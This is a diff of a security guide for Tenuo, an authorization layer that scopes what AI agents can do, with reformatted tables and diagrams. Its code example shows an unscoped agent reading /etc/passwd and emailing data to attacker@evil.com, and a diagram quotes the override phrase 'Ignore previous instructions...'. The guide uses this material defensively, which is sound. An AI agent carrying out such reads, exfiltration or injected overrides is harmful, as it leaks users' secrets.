@@ -1,19 +1,19 @@
 # AI Agent Security Patterns
 
-> **TL;DR:** Tenuo provides cryptographic authorization for AI agents. It **contains** prompt injection damage, **prevents** privilege escalation, and **enforces** the P-LLM/Q-LLM separation pattern. This guide explains what it does—and what it doesn't.
+> **TL;DR:** Tenuo provides cryptographic authorization for AI agents. It **contains** prompt injection damage, **prevents** privilege escalation, and **enforces** the P-LLM/Q-LLM separation pattern. This guide explains what it does and what it doesn't.
 
 ---
 
 ## At a Glance
 
-| ✅ Tenuo Guarantees | ❌ Tenuo Does Not Guarantee |
-|---------------------|-----------------------------|
-| **Cryptographic Authorization** (can I do this?) | **Prompt Injection Prevention** (stop the attack) |
-| **Capability Bounds** (structural limits) | **Semantic Intent Verification** (meaning limits) |
-| **Self-Issuance Prevention** (no self-promotion) | **Content-Based DLP** (secret scanning) |
-| **Monotonic Attenuation** (authority only shrinks) | **Reasoning Verification** (did you think correctly?) |
-| **Proof-of-Possession** (identity binding) | **Collusion Detection** (are you conspiring?) |
-| **Offline Verification** (no call home required) | |
+| Tenuo Guarantees | Tenuo Does Not Guarantee |
+|------------------|--------------------------|
+| Cryptographic Authorization | Prompt Injection Prevention |
+| Capability Bounds (structural limits) | Semantic Intent Verification |
+| Self-Issuance Prevention | Content-Based DLP |
+| Monotonic Attenuation | Reasoning Verification |
+| Proof-of-Possession | Collusion Detection |
+| Offline Verification | |
 
 **Bottom line:** Tenuo is **Layer 2** in a defense-in-depth strategy.
 
@@ -27,13 +27,13 @@
 
 ```python
 # Without Tenuo: Agent has ambient authority
-agent.read_file("/etc/passwd")               # ✅ Works
-agent.send_email("attacker@evil.com", data)  # ✅ Also works! 💀
+agent.read_file("/etc/passwd")               # Works
+agent.send_email("attacker@evil.com", data)  # Also works (bad!)
 
 # With Tenuo: Agent has a scoped warrant
-agent.read_file("/data/reports/q3.pdf")      # ✅ Allowed (in warrant)
-agent.read_file("/etc/passwd")               # ❌ Blocked (not in warrant)
-agent.send_email(...)                        # ❌ Blocked (no email capability)
+agent.read_file("/data/reports/q3.pdf")      # Allowed (in warrant)
+agent.read_file("/etc/passwd")               # BLOCKED (not in warrant)
+agent.send_email(...)                        # BLOCKED (no email capability)
 ```
 
 **The damage is contained.** Even if the LLM is fully compromised, it cannot exceed its warrant bounds.
@@ -53,18 +53,12 @@ agent.send_email(...)                        # ❌ Blocked (no email capability)
 
 The P-LLM (Planner) / Q-LLM (Quarantined Executor) pattern separates reasoning from execution. Think of it as separating "the brain" from "the hands".
 
-```mermaid
-graph LR
-    A[User Request] --> B[P-LLM<br/>Planner]
-    B -->|Issues Warrant| C[Q-LLM<br/>Executor]
-    C -->|Executes| D[Tool Server]
-    
-    B -.->|Cannot Execute| D
-    C -.->|Cannot Plan| B
-    
-    style B fill:#e1f5ff,stroke:#01579b
-    style C fill:#fff4e1,stroke:#ff6f00
-    style D fill:#e8f5e9,stroke:#2e7d32
+```
+                    Issues Warrant
+User Request --> [P-LLM Planner] -------------> [Q-LLM Executor] --> Tool Server
+                       |                              |
+                       |  Cannot Execute              |  Cannot Plan
+                       +------------------------------+
 ```
 
 > [!IMPORTANT]
@@ -82,8 +76,7 @@ graph LR
 
 ### Implementation Pattern
 
-<details>
-<summary><strong>✅ Correct: P-LLM Issues to Q-LLM</strong></summary>
+**Correct: P-LLM Issues to Q-LLM**
 
 ```python
 # P-LLM: Holds an issuer warrant (cannot execute)
@@ -100,12 +93,10 @@ exec_warrant = (issuer_warrant.issue_execution()
     .holder(q_llm_kp.public_key)  # Different identity!
     .issue(planner_kp))
 ```
-</details>
 
-<details>
-<summary><strong>❌ Blocked: Self-Issuance</strong></summary>
+**Blocked: Self-Issuance**
 
-Tenuo strictly enforces that a planner cannot grant execution authority to **itself**.
+Tenuo strictly enforces that a planner cannot grant execution authority to itself.
 
 ```python
 # This FAILS with SelfIssuanceProhibited error:
@@ -114,7 +105,6 @@ bad_warrant = (issuer_warrant.issue_execution()
     .issue(planner_kp))
 # Error: "issuer cannot grant execution warrants to themselves"
 ```
-</details>
 
 ---
 
@@ -163,11 +153,11 @@ User Input ("Ignore previous instructions...")
 
 | Attack Attempt | Tenuo Response |
 |----------------|----------------|
-| **Call unauthorized tool** | ❌ Blocked (Not in warrant) |
-| **Exceed parameter bounds** | ❌ Blocked (Constraint violation) |
-| **Escalate privileges** | ❌ Blocked (Monotonicity check) |
-| **Use expired warrant** | ❌ Blocked (TTL check) |
-| **Impersonate agent** | ❌ Blocked (PoP signature failure) |
+| Call unauthorized tool | Blocked (not in warrant) |
+| Exceed parameter bounds | Blocked (constraint violation) |
+| Escalate privileges | Blocked (monotonicity check) |
+| Use expired warrant | Blocked (TTL check) |
+| Impersonate agent | Blocked (PoP signature failure) |
 
 ---
 
@@ -179,16 +169,25 @@ Real-world systems involve chains of delegation. Tenuo supports this natively.
 
 Trust flows down the chain. Each step creates a narrower scope of authority.
 
-```mermaid
-graph TD
-    Root[Control Plane<br/>Trust: System] -->|Delegates| Orch[Orchestrator<br/>Trust: Privileged]
-    Orch -->|Delegates| Worker[Worker Agent<br/>Trust: Internal]
-    Worker -->|Calls| Tool[External API<br/>Trust: External]
-    
-    style Root fill:#d1c4e9
-    style Orch fill:#bbdefb
-    style Worker fill:#c8e6c9
-    style Tool fill:#ffecb3
+```
+┌─────────────────────────────┐
+│ Control Plane (System)      │
+└──────────────┬──────────────┘
+               │ Delegates
+               ▼
+┌─────────────────────────────┐
+│ Orchestrator (Privileged)   │
+└──────────────┬──────────────┘
+               │ Delegates
+               ▼
+┌─────────────────────────────┐
+│ Worker Agent (Internal)     │
+└──────────────┬──────────────┘
+               │ Calls
+               ▼
+┌─────────────────────────────┐
+│ External API (External)     │
+└─────────────────────────────┘
 ```
 
 ### Trust Levels (Optional Safety Net)
